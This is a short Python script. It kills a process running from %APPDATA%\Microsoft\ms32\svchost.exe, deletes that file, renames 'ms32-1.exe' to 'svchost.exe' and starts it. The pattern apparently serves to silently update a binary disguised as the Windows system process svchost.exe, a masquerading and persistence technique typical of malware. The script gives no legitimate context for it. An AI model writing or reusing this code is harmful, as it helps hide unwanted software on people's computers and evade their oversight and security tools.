from os.path import exists
from os import remove, rmdir,listdir, rename, startfile,path,getenv
from subprocess import run
from time import sleep
sleep(5)
import psutil

# Resolve full path
target_path = path.join(getenv("APPDATA"), "Microsoft", "ms32", "svchost.exe")

# Iterate through all running processes
for proc in psutil.process_iter(['pid', 'exe', 'name']):
    try:
        if proc.info['exe'] and path.normcase(proc.info['exe']) == path.normcase(target_path):
            print(f"[+] Found PID {proc.pid}, killing {proc.info['exe']}")
            proc.kill()
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        pass

remove("svchost.exe")

rename("ms32-1.exe","svchost.exe")
startfile("svchost.exe")